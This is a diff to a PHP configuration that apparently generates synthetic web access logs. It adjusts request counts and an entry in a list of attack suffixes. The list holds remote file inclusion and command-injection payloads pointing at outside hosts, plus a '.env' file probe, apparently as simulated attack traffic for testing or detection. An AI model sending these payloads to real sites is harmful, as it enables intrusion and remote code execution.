@@ -6,8 +6,8 @@ $time_zone = 'Europe/Athens';
 $time_format = 'd/M/Y:H:i:s';
 
 $repeater = [
-  '1' => 150,
-  '10' => 3,
+  '1' => 100,
+  '10' => 1,
 ];
 
 $request_ips = [
@@ -108,7 +108,7 @@ $attack_suffix = [
     '?page=http://192.168.80.128/rfi.php' => 3,
     '?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php' => 5,
     '.env/README.txt' => 10,
-    '.well-known/allowed/' => 8,
+    '.well-known/assetlinks.json' => 8,
 ];
 
 $request_paths = [
